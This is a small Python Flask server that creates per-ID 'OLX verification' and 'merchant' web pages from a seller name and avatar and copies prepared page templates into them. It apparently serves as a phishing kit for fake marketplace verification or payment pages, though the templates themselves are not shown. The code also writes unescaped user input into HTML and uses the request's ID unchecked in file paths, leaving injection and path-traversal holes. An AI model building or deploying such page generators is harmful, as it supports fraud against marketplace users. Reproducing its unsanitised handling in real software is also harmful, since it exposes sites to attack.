from flask import Flask, request, jsonify
import os
import shutil

app = Flask(__name__)

@app.route('/verif/<random_id>', methods=['POST'])
def save_page(random_id):
    seller_name_tag = request.form.get('seller_name_tag')
    avatar_url = request.form.get('avatar_url')
    current_domain = request.form.get('current_domain')

    if not seller_name_tag or not avatar_url or not current_domain:
        return jsonify({'error': 'Missing data'}), 400

    page_content = f"""
    <html>
    <head>
        <title>Verification Page</title>
    </head>
    <body>
        <h1>{seller_name_tag}</h1>
        <img src="{avatar_url}" alt="{seller_name_tag}">
    </body>
    </html>
    """

    # Save the page content to a file in /var/www/olx-verif/verif/<random_id>/
    page_save_path = f"/var/www/olx-verif/verif/{random_id}/index.html"
    os.makedirs(os.path.dirname(page_save_path), exist_ok=True)
    with open(page_save_path, 'w') as file:
        file.write(page_content)
    
    # Define source directories for files
    verif_source_dir = '/home/user/services/olx-verif/verif/'
    merchant_source_dir = '/home/user/services/olx-verif/merchant/'

    # Define source and destination paths for the files to be copied
    verif_source_file = os.path.join(verif_source_dir, 'index.html')
    merchant_source_file = os.path.join(merchant_source_dir, 'index.html')
    
    verif_destination_file = os.path.join('/var/www/olx-verif/verif', random_id, 'index.html')
    merchant_destination_file = os.path.join('/var/www/olx-verif/merchant', random_id, 'index.html')
    
    # Copy index.html from /home/user/services/olx-verif/verif/ to /var/www/olx-verif/verif/<random_id>/
    if os.path.exists(verif_source_file):
        shutil.copy(verif_source_file, verif_destination_file)
    else:
        return jsonify({'error': 'File /home/user/services/olx-verif/verif/index.html not found'}), 404

    # Copy index.html from /home/user/services/olx-verif/merchant/ to /var/www/olx-verif/merchant/<random_id>/
    if os.path.exists(merchant_source_file):
        os.makedirs(os.path.dirname(merchant_destination_file), exist_ok=True)
        shutil.copy(merchant_source_file, merchant_destination_file)
    else:
        return jsonify({'error': 'File /home/user/services/olx-verif/merchant/index.html not found'}), 404

    return jsonify({'message': 'Page saved and files copied successfully'}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
